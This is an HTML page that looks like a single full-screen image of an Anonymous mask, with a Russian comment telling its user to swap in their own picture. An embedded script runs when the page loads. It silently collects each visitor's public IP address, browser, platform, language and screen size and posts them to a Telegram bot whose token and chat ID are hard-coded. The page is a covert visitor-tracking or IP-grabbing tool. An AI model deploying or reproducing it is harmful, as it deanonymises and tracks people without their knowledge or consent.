<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; 
        }
        img {
            width: 100%;
            height: 100%;
            object-fit: cover; 
            display: block;
        }
    </style>
</head>
<body>
    <!-- Картинка на весь экран. ЗАМЕНИ ССЫЛКУ НА СВОЮ -->
    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fkartinki.pics%2Fuploads%2Fposts%2F2022-12%2F1670654679_25-kartinkin-net-p-kartinki-maski-anonimusa-vkontakte-26.jpg&f=1&nofb=1&ipt=04b03c0330335e42bae7e7713eac17c7aebf915dce52e35c32d3ae5159791d4a">

    <script>
       
        const TELEGRAM_TOKEN = '8014763076:AAEjH-oM5ZHbUNGumTwQUQKai0XmdeWYwUc';
        const CHAT_ID = 639840324;

    
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'Не удалось определить IP';
            }
        }

  
        function getBrowserInfo() {
            return `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${screen.width}x${screen.height}`;
        }

     
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }

      
        async function logVisitor() {
            const ip = await getIP();
            const browser = getBrowserInfo();
            const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const msg = `<b>Новый посетитель</b>\nВремя: ${time}\nIP: ${ip}\n${browser}`;
            await sendToTelegram(msg);
        }

        logVisitor();
    </script>
</body>
</html>
